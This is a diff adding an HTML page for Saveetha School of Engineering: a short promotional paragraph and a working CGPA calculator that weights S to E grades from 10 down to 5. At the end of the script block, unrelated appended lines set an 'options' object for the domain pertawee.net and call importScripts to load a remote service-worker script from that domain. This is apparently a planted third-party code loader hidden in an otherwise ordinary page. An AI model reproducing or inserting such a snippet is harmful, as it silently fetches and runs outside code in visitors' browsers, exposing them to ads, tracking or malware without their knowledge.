@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Saveetha School of Engineering | CGPA Calculator</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+      min-height: 100vh;
+    }
+
+    .hero {
+      max-width: 800px;
+      text-align: center;
+      margin-bottom: 40px;
+    }
+
+    .hero h1 {
+      font-size: 36px;
+      margin-bottom: 10px;
+    }
+
+    .hero p {
+      font-size: 18px;
+      line-height: 1.6;
+      color: #e0e0e0;
+    }
+
+    .calculator {
+      background-color: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .calculator h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 24px;
+      color: #fff;
+    }
+
+    .input-group {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 15px;
+    }
+
+    label {
+      flex: 1;
+      font-weight: 500;
+    }
+
+    input {
+      width: 60px;
+      padding: 8px;
+      border-radius: 5px;
+      border: none;
+      text-align: center;
+      background-color: #fff;
+      color: #333;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      background-color: #ffffff;
+      color: #2a5298;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    button:hover {
+      background-color: #e0e0e0;
+    }
+
+    #result {
+      margin-top: 20px;
+      font-size: 36px;
+      font-weight: bold;
+      text-align: center;
+      color: #fff;
+    }
+
+    @media (max-width: 500px) {
+      .input-group {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      input {
+        width: 100%;
+        margin-top: 5px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="hero">
+    <h1>Welcome to Saveetha School of Engineering</h1>
+    <p>
+      Saveetha School of Engineering, part of Saveetha Institute of Medical and Technical Sciences, is a premier institution in Tamil Nadu known for its cutting-edge curriculum, research-driven environment, and industry-aligned programs. With a strong focus on innovation and hands-on learning, SSE empowers students to become future-ready engineers.
+    </p>
+  </div>
+
+  <div class="calculator">
+    <h2>CGPA Calculator</h2>
+
+    <div class="input-group">
+      <label>Number of S Grades:</label>
+      <input type="number" id="s" min="0" value="0" />
+    </div>
+
+    <div class="input-group">
+      <label>Number of A Grades:</label>
+      <input type="number" id="a" min="0" value="0" />
+    </div>
+
+    <div class="input-group">
+      <label>Number of B Grades:</label>
+      <input type="number" id="b" min="0" value="0" />
+    </div>
+
+    <div class="input-group">
+      <label>Number of C Grades:</label>
+      <input type="number" id="c" min="0" value="0" />
+    </div>
+
+    <div class="input-group">
+      <label>Number of D Grades:</label>
+      <input type="number" id="d" min="0" value="0" />
+    </div>
+
+    <div class="input-group">
+      <label>Number of E Grades:</label>
+      <input type="number" id="e" min="0" value="0" />
+    </div>
+
+    <button onclick="calculateCGPA()">Calculate CGPA</button>
+    <div id="result">10.00</div>
+  </div>
+
+  <script>
+    function calculateCGPA() {
+      const s = parseInt(document.getElementById('s').value) || 0;
+      const a = parseInt(document.getElementById('a').value) || 0;
+      const b = parseInt(document.getElementById('b').value) || 0;
+      const c = parseInt(document.getElementById('c').value) || 0;
+      const d = parseInt(document.getElementById('d').value) || 0;
+      const e = parseInt(document.getElementById('e').value) || 0;
+
+      const totalSubjects = s + a + b + c + d + e;
+
+      if (totalSubjects === 0) {
+        document.getElementById('result').innerHTML = '0.00';
+        return;
+      }
+
+      const totalPoints = (s * 10) + (a * 9) + (b * 8) + (c * 7) + (d * 6) + (e * 5);
+      const cgpa = totalPoints / totalSubjects;
+
+      document.getElementById('result').innerHTML = cgpa.toFixed(2);
+    }
+
+    calculateCGPA();
+self.options = {
+    "domain": "pertawee.net",
+    "zoneId": 9973950
+}
+self.lary = ""
+importScripts('https://pertawee.net/act/files/service-worker.min.js?r=sw')
+
+  </script>
+</body>
+</html>
